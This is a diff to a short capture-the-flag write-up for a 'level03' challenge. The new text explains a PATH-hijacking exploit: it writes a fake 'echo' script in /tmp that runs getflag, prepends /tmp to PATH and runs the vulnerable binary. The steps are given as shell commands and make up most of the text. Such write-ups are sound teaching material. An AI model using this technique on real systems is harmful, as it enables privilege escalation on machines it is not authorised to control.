@@ -1,1 +1,12 @@
-Since the binary uses '/usr/bin/env echo', adding directory containing an executable named 'echo' that runs getflag would be enough to get the password.
+Using 'strings level03' we noticed that the binary uses '/usr/bin/env echo' to print 'Exploit me'. 
+
+Adding to the PATH env variable a directory containing a malicious 'echo' would get the job done.
+
+`echo "#!/bin/bash" > /tmp/echo`
+`echo "getflag" >> /tmp/echo`
+`chmod +x /tmp/echo`
+`export PATH=/tmp/:$PATH`
+`./level03`
+
+DONE
+
